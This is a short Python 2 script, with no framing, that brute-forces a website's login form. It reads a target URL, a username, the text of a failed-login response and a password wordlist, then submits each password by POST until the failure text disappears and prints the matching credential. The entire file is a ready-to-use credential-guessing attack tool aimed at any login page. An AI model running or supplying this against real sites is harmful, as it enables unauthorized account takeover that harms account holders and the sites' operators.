import requests

#change post or get if get or post
#change username:name password:name and other param:name
class bc:
    OKGREEN = '\033[92m'
    RED = '\033[91m'
    BOLD = '\033[1m'

url = raw_input("\nUrl post: ")
usn = raw_input("Username_Email_Whatever: ")
ter = raw_input("Invalid login response: ")
pwls = raw_input("Enter psw file [empty = psw.txt]: ").strip("' ") or "psw.txt"
psf = open(pwls, "r").readlines()

for j in psf:
 jb=j.strip()
 http = requests.post(url, data={"password":jb,"username":usn})
 con = http.content
 if ter not in con:
  print bc.OKGREEN,bc.BOLD+"\n [*^*] Correct: username= "+usn + " , password= "+jb+"\n"
  break;
 else:
  print "[!!!] invalid password: "+jb
